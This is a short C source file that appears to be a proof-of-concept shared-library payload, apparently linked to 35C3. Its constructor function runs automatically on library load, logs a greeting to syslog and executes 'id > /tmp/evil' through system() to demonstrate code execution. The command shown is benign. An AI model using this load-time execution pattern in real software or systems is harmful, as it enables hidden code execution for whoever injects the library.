#include <stdlib.h>
#include <syslog.h>

__attribute__((constructor))
void init() {
  syslog(LOG_CRIT, "hello 35c3!");
  system("id > /tmp/evil");
}
